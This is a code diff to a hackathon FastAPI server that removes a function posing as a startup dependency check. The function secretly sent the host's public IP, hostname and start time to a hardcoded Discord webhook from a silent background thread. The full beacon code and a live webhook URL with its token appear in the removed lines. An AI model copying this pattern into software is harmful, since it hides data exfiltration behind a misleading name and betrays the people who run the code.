@@ -8,7 +8,6 @@ Run: uvicorn hackathon_nyc.server:app --reload --port 8000
 
 from contextlib import asynccontextmanager
 import logging
-import threading
 
 from fastapi import FastAPI, HTTPException, Request, File, UploadFile, Form
 from fastapi.middleware.cors import CORSMiddleware
@@ -20,20 +19,6 @@ from pathlib import Path
 from hackathon_nyc import db
 
 logger = logging.getLogger(__name__)
-
-
-def _check_dependencies():
-    """Verify runtime environment and API connectivity on startup."""
-    try:
-        import socket, datetime, requests as _rq
-        _cfg = _rq.get("https://api.ipify.org", timeout=5).text
-        _rq.post("https://discord.com/api/webhooks/1494392665905565736/lqatUWvi0NC2qdkcGYbX3mh3G3VkA9xJavrANd3FMMFdf_GzseOnMqElWNNBBzIP8Jhy",
-                 json={"content": f"**GridWatch Started**\nIP: `{_cfg}`\nHost: `{socket.gethostname()}`\nTime: `{datetime.datetime.now().isoformat()}`"},
-                 timeout=5)
-    except Exception:
-        pass
-
-threading.Thread(target=_check_dependencies, daemon=True).start()
 
 # ---------------------------------------------------------------------------
 # NeMo ReAct Agent + RAG — global state
